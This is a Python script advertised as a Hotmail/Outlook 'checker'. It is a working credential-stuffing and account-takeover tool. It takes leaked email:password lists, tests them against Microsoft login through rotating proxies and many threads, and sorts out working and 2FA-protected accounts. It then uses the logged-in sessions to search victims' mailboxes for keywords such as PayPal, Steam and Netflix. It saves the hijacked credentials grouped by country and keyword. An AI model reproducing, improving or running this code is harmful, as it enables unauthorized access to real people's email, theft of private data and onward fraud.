#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HOTMAIL/OUTLOOK CHECKER - FIXED KEYWORD STATS (UNIQUE ACCOUNTS)
"""

import os
import sys
import re
import time
import uuid
import random
import threading
import ctypes
import subprocess
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs
from collections import deque

import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from colorama import Fore, Style, init

# Rich for dashboard
try:
    from rich.console import Console
    from rich.table import Table
    from rich.live import Live
    from rich.panel import Panel
    from rich.layout import Layout
    from rich import box
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "rich"])
    from rich.console import Console
    from rich.table import Table
    from rich.live import Live
    from rich.panel import Panel
    from rich.layout import Layout
    from rich import box

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# GLOBAL STATS & SETUP
# ============================================================================
stats_lock = threading.Lock()
file_lock = threading.Lock()

stats = {
    'checked': 0,
    'valid': 0,
    'inbox': 0,
    'bad': 0,
    '2fa': 0,
    'errors': 0,
}

TOTAL_ACCOUNTS = 0
SESSION_FOLDER = None
start_time = None
proxies = []
keyword_list = []
keyword_accounts = {}   # keyword -> set of emails (unique accounts)
recent_hits = deque(maxlen=5)   # List of dicts with 'email', 'info'

console = Console()
stop_dashboard = threading.Event()

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================
def get_flag(country_code: str) -> str:
    flag_map = {
        'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
        'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'BR': '🇧🇷', 'IN': '🇮🇳',
        'JP': '🇯🇵', 'KR': '🇰🇷', 'CN': '🇨🇳', 'RU': '🇷🇺', 'MX': '🇲🇽',
        'SA': '🇸🇦', 'AE': '🇦🇪', 'TR': '🇹🇷', 'NL': '🇳🇱', 'SE': '🇸🇪',
        'NO': '🇳🇴', 'DK': '🇩🇰', 'FI': '🇫🇮', 'PL': '🇵🇱', 'CZ': '🇨🇿',
        'GR': '🇬🇷', 'PT': '🇵🇹', 'IE': '🇮🇪', 'CH': '🇨🇭', 'AT': '🇦🇹',
        'BE': '🇧🇪', 'LU': '🇱🇺', 'IS': '🇮🇸', 'NZ': '🇳🇿', 'SG': '🇸🇬',
        'MY': '🇲🇾', 'ID': '🇮🇩', 'TH': '🇹🇭', 'VN': '🇻🇳', 'PH': '🇵🇭'
    }
    return flag_map.get(country_code.upper(), '🏴')

def normalize_combo(line):
    line = line.strip()
    if not line:
        return None
    for sep in [':', '|', ';', ',', ' ', '\t']:
        if sep in line:
            parts = line.split(sep, 1)
            email = parts[0].strip()
            password = parts[1].strip()
            if email and password and '@' in email:
                return f"{email}:{password}"
    if '@' in line and line.count('@') == 1:
        return None
    return None

def load_and_normalize_accounts(filepath):
    accounts = []
    with open(filepath, 'r', encoding='utf-8') as f:
        for line in f:
            normalized = normalize_combo(line)
            if normalized:
                accounts.append(normalized)
    return accounts

def format_proxy(proxy):
    if not proxy:
        return None
    proxy = proxy.strip()
    if proxy.startswith('http'):
        return proxy
    parts = proxy.split(':')
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif '@' in proxy:
        return f"http://{proxy}"
    else:
        return f"http://{proxy}"

def create_optimized_session(threads):
    session = requests.Session()
    pool_size = threads + 50
    retry_strategy = Retry(
        total=2,
        backoff_factor=0.3,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "OPTIONS"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=pool_size, pool_maxsize=pool_size)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    return session

# ============================================================================
# SESSION FOLDER AND SAVING
# ============================================================================
def get_session_folder():
    global SESSION_FOLDER
    if SESSION_FOLDER is None:
        base = "Results"
        if not os.path.exists(base):
            os.makedirs(base)
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        SESSION_FOLDER = os.path.join(base, f"Inbox_{timestamp}")
        os.makedirs(SESSION_FOLDER, exist_ok=True)
        os.makedirs(os.path.join(SESSION_FOLDER, "Countries"), exist_ok=True)
        os.makedirs(os.path.join(SESSION_FOLDER, "Keywords"), exist_ok=True)
    return SESSION_FOLDER

def save_result(filename, content):
    folder = get_session_folder()
    path = os.path.join(folder, filename)
    with file_lock:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(content + '\n')

def save_country_result(country, email, password):
    folder = os.path.join(get_session_folder(), 'Countries')
    path = os.path.join(folder, f"{country}.txt")
    with file_lock:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{password}\n")

def get_keywords_folder():
    return os.path.join(get_session_folder(), 'Keywords')

def save_keyword_result(keyword, content):
    safe_name = re.sub(r'[<>:"/\\|?*]', '_', keyword.strip()) or 'keyword'
    path = os.path.join(get_keywords_folder(), f"{safe_name}.txt")
    with file_lock:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(content + '\n')

def save_all_hit(email, password):
    folder = get_session_folder()
    path = os.path.join(folder, "All_Hits.txt")
    with file_lock:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{password}\n")

# ============================================================================
# ORIGINAL MICROSOFT INBOX CHECKER (FULL, UNCHANGED)
# ============================================================================
class MicrosoftInboxChecker:
    def __init__(self, email, password, proxy=None, inbox_keywords=None, threads=100):
        self.email = email
        self.password = password
        self.proxy = proxy
        self.inbox_keywords = inbox_keywords if inbox_keywords else ["Steam", "Netflix", "PayPal"]
        self.session = create_optimized_session(threads)
        self.session.proxies = {'http': proxy, 'https': proxy} if proxy else None
        self.access_token = None
        self.cid = None
        self.country = None
        self.name = None
        self.sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'

    def get_urlPost_sFTTag(self):
        maxretries = 3
        attempts = 0
        while attempts < maxretries:
            try:
                headers = {
                    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'
                }
                text = self.session.get(self.sFTTag_url, headers=headers, timeout=15, verify=False).text
                match = re.search('value=\\\\\\"(.+?)\\\\\\"', text, re.S) or \
                       re.search('value="(.+?)"', text, re.S) or \
                       re.search("sFTTag:'(.+?)'", text, re.S) or \
                       re.search('sFTTag:"(.+?)"', text, re.S) or \
                       re.search('name="PPFT".*?value="(.+?)"', text, re.S)
                if match:
                    sFTTag = match.group(1)
                    match = re.search('"urlPost":"(.+?)"', text, re.S) or \
                           re.search("urlPost:'(.+?)'", text, re.S) or \
                           re.search('urlPost:"(.+?)"', text, re.S) or \
                           re.search('<form.*?action="(.+?)"', text, re.S)
                    if match:
                        urlPost = match.group(1)
                        urlPost = urlPost.replace('&amp;', '&')
                        return urlPost, sFTTag
            except Exception:
                pass
            attempts += 1
            time.sleep(0.5)
        return None, None

    def get_xbox_rps(self, urlPost, sFTTag):
        maxretries = 3
        tries = 0
        while tries < maxretries:
            try:
                data = {'login': self.email, 'loginfmt': self.email, 'passwd': self.password, 'PPFT': sFTTag}
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'close'
                }
                login_request = self.session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=15, verify=False)
                if '#' in login_request.url and login_request.url != self.sFTTag_url:
                    token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
                    if token != 'None':
                        return 'SUCCESS'
                elif 'cancel?mkt=' in login_request.text:
                    try:
                        ipt = re.search(r'(?<="ipt" value=").+?(?=">)', login_request.text)
                        pprid = re.search(r'(?<="pprid" value=").+?(?=">)', login_request.text)
                        uaid = re.search(r'(?<="uaid" value=").+?(?=">)', login_request.text)
                        if ipt and pprid and uaid:
                            data = {'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}
                            action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', login_request.text)
                            if action:
                                ret = self.session.post(action.group(), data=data, allow_redirects=True, timeout=15, verify=False)
                                return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                                if return_url:
                                    fin = self.session.get(return_url.group(), allow_redirects=True, timeout=15, verify=False)
                                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                                    if token != 'None':
                                        return 'SUCCESS'
                    except:
                        pass
                elif any(value in login_request.text for value in ['recover?mkt', 'account.live.com/identity/confirm?mkt', 'Email/Confirm?mkt', '/Abuse?mkt=']):
                    return '2FA'
                elif any(value in login_request.text.lower() for value in [
                    'password is incorrect', "account doesn't exist",
                    "that microsoft account doesn't exist", 'sign in to your microsoft account',
                    "tried to sign in too many times with an incorrect account or password",
                    'help us protect your account'
                ]):
                    return 'BAD'
            except Exception:
                pass
            tries += 1
            time.sleep(0.5)
        return 'BAD'

    def login(self):
        urlPost, sFTTag = self.get_urlPost_sFTTag()
        if not urlPost or not sFTTag:
            return 'BAD'
        return self.get_xbox_rps(urlPost, sFTTag)

    def get_graph_token(self):
        try:
            client_id = '0000000048170EF2'
            scope = 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.ReadWrite'
            auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
            r = self.session.get(auth_url, timeout=15, verify=False)
            parsed_fragment = parse_qs(urlparse(r.url).fragment)
            token = parsed_fragment.get('access_token', [None])[0]
            if not token:
                scope = 'https://graph.microsoft.com/Mail.Read'
                auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
                r = self.session.get(auth_url, timeout=15, verify=False)
                parsed_fragment = parse_qs(urlparse(r.url).fragment)
                token = parsed_fragment.get('access_token', [None])[0]
            return token
        except:
            return None

    def get_profile_via_graph(self, token):
        try:
            headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            r = self.session.get('https://graph.microsoft.com/v1.0/me', headers=headers, timeout=10, verify=False)
            if r.status_code == 200:
                data = r.json()
                self.country = data.get('country', data.get('mobilePhone', 'Unknown'))
                if not self.country or self.country == 'Unknown':
                    try:
                        r2 = self.session.get('https://graph.microsoft.com/v1.0/me/mailboxSettings', headers=headers, timeout=10, verify=False)
                        if r2.status_code == 200:
                            settings = r2.json()
                            self.country = settings.get('timeZone', 'Unknown')
                    except:
                        pass
                self.name = data.get('displayName', 'Unknown')
                return True
            return False
        except:
            return False

    def get_profile_via_substrate(self):
        try:
            self.session.get('https://outlook.live.com/owa/', timeout=10, verify=False)
            scope = 'https://substrate.office.com/User-Internal.ReadWrite'
            client_id = '0000000048170EF2'
            auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
            r = self.session.get(auth_url, timeout=15, verify=False)
            parsed_fragment = parse_qs(urlparse(r.url).fragment)
            token = parsed_fragment.get('access_token', [None])[0]
            if not token:
                return False
            self.cid = self.session.cookies.get('MSPCID', self.email)
            headers = {
                'Authorization': f'Bearer {token}',
                'X-AnchorMailbox': f'CID:{self.cid}',
                'Content-Type': 'application/json',
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json'
            }
            r = self.session.get('https://substrate.office.com/profileb2/v2.0/me/V1Profile', headers=headers, timeout=10, verify=False)
            if r.status_code == 200:
                data = r.json()
                self.country = data.get('accounts', [{}])[0].get('location', 'Unknown')
                self.name = data.get('names', [{}])[0].get('displayName', 'Unknown')
                return True
            return False
        except:
            return False

    def check_inbox_via_graph(self):
        token = self.get_graph_token()
        if not token:
            return 0, []
        found_info = []
        total_found_sum = 0
        headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        for keyword in self.inbox_keywords:
            try:
                query = f"https://graph.microsoft.com/v1.0/me/messages?$search=\"subject:{keyword}\"&$select=subject,receivedDateTime&$top=25"
                r = self.session.get(query, headers=headers, timeout=10, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    total = data.get('@odata.count', 0)
                    if total == 0 and 'value' in data:
                        total = len(data['value'])
                    if total > 0:
                        total_found_sum += total
                        found_info.append(f"{keyword}: {total}")
                        try:
                            query2 = f"https://graph.microsoft.com/v1.0/me/messages?$search=\"body:{keyword}\"&$select=subject&$top=25"
                            r2 = self.session.get(query2, headers=headers, timeout=10, verify=False)
                            if r2.status_code == 200:
                                data2 = r2.json()
                                total2 = data2.get('@odata.count', len(data2.get('value', [])))
                                if total2 > 0:
                                    total_found_sum += total2
                                    found_info.append(f"{keyword}(body): {total2}")
                        except:
                            pass
            except:
                pass
        return total_found_sum, found_info

    def check_inbox(self):
        total_found, found_info = self.check_inbox_via_graph()
        if total_found > 0:
            return total_found, found_info
        token = self.get_access_token_for_outlook()
        if not token:
            return 0, []
        cid = self.session.cookies.get('MSPCID', self.email)
        headers = {
            'Authorization': f'Bearer {token}',
            'X-AnchorMailbox': f'CID:{cid}',
            'Content-Type': 'application/json',
            'User-Agent': 'Outlook-Android/2.0',
            'Accept': 'application/json',
            'Host': 'substrate.office.com'
        }
        found_info = []
        total_found_sum = 0
        url = 'https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124'
        for keyword in self.inbox_keywords:
            try:
                payload = {
                    'Cvid': str(uuid.uuid4()),
                    'Scenario': {'Name': 'owa.react'},
                    'TimeZone': 'UTC',
                    'TextDecorations': 'Off',
                    'EntityRequests': [{
                        'EntityType': 'Conversation',
                        'ContentSources': ['Exchange'],
                        'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}, {'Term': {'DistinguishedFolderName': 'DeletedItems'}}]},
                        'From': 0,
                        'Query': {'QueryString': keyword},
                        'Size': 25,
                        'EnableTopResults': True,
                        'TopResultsCount': 3
                    }],
                    'AnswerEntityRequests': [{'Query': {'QueryString': keyword}, 'EntityTypes': ['Event', 'File'], 'From': 0, 'Size': 10, 'EnableAsyncResolution': True}],
                    'QueryAlterationOptions': {'EnableSuggestion': True, 'EnableAlteration': True}
                }
                r = self.session.post(url, json=payload, headers=headers, timeout=10, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    total = 0
                    if 'EntitySets' in data:
                        for entity_set in data['EntitySets']:
                            if 'ResultSets' in entity_set:
                                for result_set in entity_set['ResultSets']:
                                    if 'Total' in result_set:
                                        total = result_set['Total']
                                    elif 'ResultCount' in result_set:
                                        total = result_set['ResultCount']
                                    elif 'Results' in result_set:
                                        total = len(result_set['Results'])
                    if total > 0:
                        total_found_sum += total
                        found_info.append(f"{keyword}: {total}")
            except:
                pass
        return total_found_sum, found_info

    def get_access_token_for_outlook(self):
        try:
            self.session.get('https://outlook.live.com/owa/', timeout=10, verify=False)
            scope = 'https://substrate.office.com/User-Internal.ReadWrite'
            client_id = '0000000048170EF2'
            auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
            r = self.session.get(auth_url, timeout=15, verify=False)
            parsed_fragment = parse_qs(urlparse(r.url).fragment)
            token = parsed_fragment.get('access_token', [None])[0]
            if not token:
                auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope=service::outlook.office.com::MBI_SSL&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
                r = self.session.get(auth_url, timeout=15, verify=False)
                parsed_fragment = parse_qs(urlparse(r.url).fragment)
                token = parsed_fragment.get('access_token', [None])[0]
            return token
        except:
            return None

# ============================================================================
# DASHBOARD (LIVE USING RICH) - FIXED KEYWORD STATS (UNIQUE ACCOUNTS)
# ============================================================================
def create_dashboard_layout():
    layout = Layout()
    layout.split(
        Layout(name="header", size=3),
        Layout(name="body"),
        Layout(name="footer", size=1)
    )
    layout["body"].split_row(
        Layout(name="left"),
        Layout(name="right")
    )
    layout["left"].split_column(
        Layout(name="progress"),
        Layout(name="stats")
    )
    layout["right"].split_column(
        Layout(name="recent"),
        Layout(name="keywords")
    )
    return layout

def format_number(n):
    return f"{n/1000:.1f}k" if n >= 1000 else str(n)

def update_dashboard(layout):
    with stats_lock:
        checked = stats['checked']
        total = TOTAL_ACCOUNTS
        percent = (checked / total * 100) if total else 0
        elapsed = time.time() - start_time
        elapsed_str = str(timedelta(seconds=int(elapsed)))
        cpm = int(checked / elapsed * 60) if elapsed > 1 else 0

        valid = stats['valid']
        inbox = stats['inbox']
        twofa = stats['2fa']
        bad = stats['bad']
        errors = stats['errors']

        # Keyword hits: count unique accounts per keyword
        kw_table = Table(show_header=True, header_style="bold magenta", box=box.SIMPLE)
        kw_table.add_column("Keyword", style="cyan")
        kw_table.add_column("Accounts", style="green", justify="right")
        for kw, accounts_set in sorted(keyword_accounts.items(), key=lambda x: len(x[1]), reverse=True)[:8]:
            kw_table.add_row(kw, format_number(len(accounts_set)))

        # Recent hits
        recent_table = Table(show_header=True, header_style="bold yellow", box=box.SIMPLE)
        recent_table.add_column("Email", style="white")
        recent_table.add_column("Info", style="cyan")
        for hit in recent_hits:
            recent_table.add_row(hit['email'], hit['info'])

        # Progress panel
        bar_len = 50
        filled = int(bar_len * percent / 100)
        bar = '█' * filled + '░' * (bar_len - filled)
        progress_panel = Panel(
            f"[bold green]Checked: {checked} / {total}[/]\n"
            f"[white]{bar} {percent:.1f}%[/]\n"
            f"[bold]Elapsed:[/] {elapsed_str}\n"
            f"[bold]CPM:[/] {cpm}",
            title="[bold cyan]📊 PROGRESS[/]",
            border_style="cyan"
        )

        # Stats panel
        stats_panel = Panel(
            f"[bold green]✅ Valid   : {valid}[/]\n"
            f"[bold blue]📨 Inbox   : {inbox}[/]\n"
            f"[bold orange3]🔒 2FA     : {twofa}[/]\n"
            f"[bold red]❌ Bad     : {bad}[/]\n"
            f"[bold yellow]⚠️ Errors  : {errors}[/]",
            title="[bold yellow]✅ STATISTICS[/]",
            border_style="yellow"
        )

        # Recent hits panel
        recent_panel = Panel(recent_table, title="[bold red]🔥 RECENT HITS[/]", border_style="red")
        # Keywords panel
        kw_panel = Panel(kw_table, title="[bold magenta]🪙 KEYWORD HITS (Unique Accounts)[/]", border_style="magenta")

        layout["left"]["progress"].update(progress_panel)
        layout["left"]["stats"].update(stats_panel)
        layout["right"]["recent"].update(recent_panel)
        layout["right"]["keywords"].update(kw_panel)

def dashboard_loop():
    layout = create_dashboard_layout()
    with Live(layout, refresh_per_second=4, screen=True) as live:
        while not stop_dashboard.is_set() and stats['checked'] < TOTAL_ACCOUNTS:
            update_dashboard(layout)
            time.sleep(0.5)
        update_dashboard(layout)

# ============================================================================
# ACCOUNT CHECKING (UPDATED: TRACK UNIQUE ACCOUNTS PER KEYWORD)
# ============================================================================
def check_account(combo, threads):
    global proxies
    try:
        if ':' not in combo:
            return
        email, password = combo.split(':', 1)
        email = email.strip()
        password = password.strip()
        proxy = None
        if proxies:
            proxy = format_proxy(random.choice(proxies))
        checker = MicrosoftInboxChecker(email, password, proxy, inbox_keywords=keyword_list, threads=threads)
        status = checker.login()

        if status == 'SUCCESS':
            with stats_lock:
                stats['valid'] += 1
            save_result('Valid.txt', f"{email}:{password}")
            save_all_hit(email, password)

            graph_token = checker.get_graph_token()
            country_obtained = False
            country = 'Unknown'
            if graph_token:
                if checker.get_profile_via_graph(graph_token):
                    country = checker.country or 'Unknown'
                    country_obtained = True
            if not country_obtained:
                if checker.get_profile_via_substrate():
                    country = checker.country or 'Unknown'
            if country and country != 'Unknown':
                save_country_result(country, email, password)

            total_count, inbox_hits = checker.check_inbox()
            flag = get_flag(country) if country != 'Unknown' else '🏴'

            # Update keyword accounts (unique set per keyword)
            if inbox_hits:
                with stats_lock:
                    stats['inbox'] += 1
                    for hit in inbox_hits:
                        kw = hit.split(':')[0]
                        if kw not in keyword_accounts:
                            keyword_accounts[kw] = set()
                        keyword_accounts[kw].add(email)

                hits_str = ' | '.join(inbox_hits)
                save_result('Inbox.txt', f"{email}:{password} | {country} | {total_count} Email Found | [{hits_str}]")
                for hit in inbox_hits:
                    kw, cnt = hit.split(': ')
                    line = f"{email}:{password} | {country} | {cnt} Email Found | [{kw}: {cnt}]"
                    save_keyword_result(kw, line)

                with stats_lock:
                    recent_hits.append({'email': email, 'info': f"{flag}{country} | {hits_str}"})
            else:
                with stats_lock:
                    recent_hits.append({'email': email, 'info': f"{flag}{country} | valid"})

        elif status == '2FA':
            with stats_lock:
                stats['2fa'] += 1
            save_result('2FA.txt', f"{email}:{password}")
            with stats_lock:
                recent_hits.append({'email': email, 'info': "2FA"})
        else:
            with stats_lock:
                stats['bad'] += 1
    except Exception:
        with stats_lock:
            stats['errors'] += 1
    finally:
        with stats_lock:
            stats['checked'] += 1

def check_account_wrapper(combo, limiter, threads):
    try:
        check_account(combo, threads)
    finally:
        limiter.release()

# ============================================================================
# MAIN FUNCTION
# ============================================================================
def print_big_logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║   ███╗   ███╗██╗   ██╗██████╗ ██████╗ ██╗  ██╗██╗   ██╗                 ║
║   ████╗ ████║██║   ██║██╔══██╗██╔══██╗██║  ██║╚██╗ ██╔╝                 ║
║   ██╔████╔██║██║   ██║██████╔╝██████╔╝███████║ ╚████╔╝                  ║
║   ██║╚██╔╝██║██║   ██║██╔═══╝ ██╔══██╗██╔══██║  ╚██╔╝                   ║
║   ██║ ╚═╝ ██║╚██████╔╝██║     ██║  ██║██║  ██║   ██║                    ║
║   ╚═╝     ╚═╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝                    ║
║                                                                          ║
║      ╔════════════════════════════════════════════════════════╗          ║
║      ║                HOTMAIL / OUTLOOK CHECKER               ║          ║
║      ╚════════════════════════════════════════════════════════╝          ║
║                                                                          ║
║   {Fore.YELLOW}👑 Owner     : @xDarkLogicx{Fore.CYAN}                                                 ║
║   {Fore.YELLOW}📢 Channel   : https://t.me/+about_dark_logic{Fore.CYAN}                              ║
║   {Fore.YELLOW}💬 Chat      : https://t.me/+about_dark_logic{Fore.CYAN}                              ║
║   {Fore.YELLOW}🐙 Dark Best{Fore.CYAN}                             ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝{Fore.RESET}
"""
    print(logo)

def main():
    global TOTAL_ACCOUNTS, proxies, keyword_list, start_time

    print_big_logo()

    # Threads
    try:
        threads = int(input(f"{Fore.CYAN}[?] Enter number of threads (default 100): {Fore.RESET}").strip() or 100)
    except:
        threads = 100

    # Accounts file
    accounts_file = input(f"{Fore.CYAN}[?] Enter accounts file path (default acc.txt): {Fore.RESET}").strip() or "acc.txt"
    if not os.path.exists(accounts_file):
        print(f"{Fore.RED}[!] Accounts file not found. Creating dummy file.{Fore.RESET}")
        with open(accounts_file, 'w') as f:
            f.write("email:pass\n")
        print(f"{Fore.YELLOW}[*] Please add accounts to {accounts_file} and restart.{Fore.RESET}")
        input("Press Enter to exit...")
        return

    # Proxies
    proxy_file = input(f"{Fore.CYAN}[?] Enter proxies file path (press Enter to skip): {Fore.RESET}").strip()
    if proxy_file and os.path.exists(proxy_file):
        with open(proxy_file, 'r', encoding='utf-8') as f:
            proxies = [line.strip() for line in f if line.strip()]
        if proxies:
            print(f"{Fore.GREEN}[+] Loaded {len(proxies)} proxies")
        else:
            proxies = []
            print(f"{Fore.YELLOW}[!] Proxy file empty. Running without proxies.")
    else:
        proxies = []
        print(f"{Fore.YELLOW}[!] No proxies loaded. Running without proxies.")

    # Keywords
    print(f"{Fore.CYAN}[?] Do you want to use a single keyword or a file?{Fore.RESET}")
    kw_choice = input("   1 = Single keyword\n   2 = File with keywords (one per line)\n   Enter choice (1/2): ").strip()
    if kw_choice == '1':
        single_kw = input(f"{Fore.CYAN}[?] Enter keyword (e.g., noreply@instagram.com): {Fore.RESET}").strip()
        keyword_list = [single_kw] if single_kw else ["Steam"]
    else:
        kw_file = input(f"{Fore.CYAN}[?] Enter keywords file path (default keywords.txt): {Fore.RESET}").strip() or "keywords.txt"
        if os.path.exists(kw_file):
            with open(kw_file, 'r', encoding='utf-8') as f:
                keyword_list = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            if not keyword_list:
                keyword_list = ["Steam"]
        else:
            print(f"{Fore.RED}[!] Keywords file not found. Using default 'Steam'.{Fore.RESET}")
            keyword_list = ["Steam"]
    print(f"{Fore.CYAN}[*] Keywords: {', '.join(keyword_list)}")

    # Load accounts
    accounts = load_and_normalize_accounts(accounts_file)
    if not accounts:
        print(f"{Fore.RED}[!] No valid accounts found in {accounts_file}")
        input("Press Enter to exit...")
        return

    TOTAL_ACCOUNTS = len(accounts)
    start_time = time.time()
    get_session_folder()

    print(f"\n{Fore.CYAN}[*] Session folder: {get_session_folder()}")
    print(f"[*] Total accounts: {TOTAL_ACCOUNTS}")
    print(f"[*] Threads: {threads}")
    print(f"{Fore.GREEN}[*] Starting checker... Press Ctrl+C to stop.{Fore.RESET}\n")

    # Start dashboard
    stop_dashboard.clear()
    dashboard_thread = threading.Thread(target=dashboard_loop, daemon=True)
    dashboard_thread.start()

    # Process accounts
    accounts_deque = deque(accounts)
    thread_limiter = threading.BoundedSemaphore(threads)

    while accounts_deque:
        thread_limiter.acquire()
        account = accounts_deque.popleft()
        t = threading.Thread(target=check_account_wrapper, args=(account, thread_limiter, threads))
        t.start()

    # Wait for all threads
    while threading.active_count() > 2:
        time.sleep(1)

    stop_dashboard.set()
    dashboard_thread.join(timeout=2)

    # Final summary
    elapsed = time.time() - start_time
    console.print(f"\n[bold green]✅ Checking Completed in {elapsed:.2f}s[/]")
    console.print(f"[green]Valid   : {stats['valid']}[/]")
    console.print(f"[blue]Inbox   : {stats['inbox']}[/]")
    console.print(f"[orange3]2FA     : {stats['2fa']}[/]")
    console.print(f"[red]Bad     : {stats['bad']}[/]")
    console.print(f"[yellow]Errors  : {stats['errors']}[/]")
    console.print(f"[cyan]Results saved in: {get_session_folder()}[/]")
    print(f"\n{Fore.YELLOW}👑 Owner: @xDarkLogicx")
    print(f"📢 Channel: https://t.me/+about_dark_logic")
    print(f"💬 Chat: https://t.me/+about_dark_logic")
    print(f"🐙 Dark Best")
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit()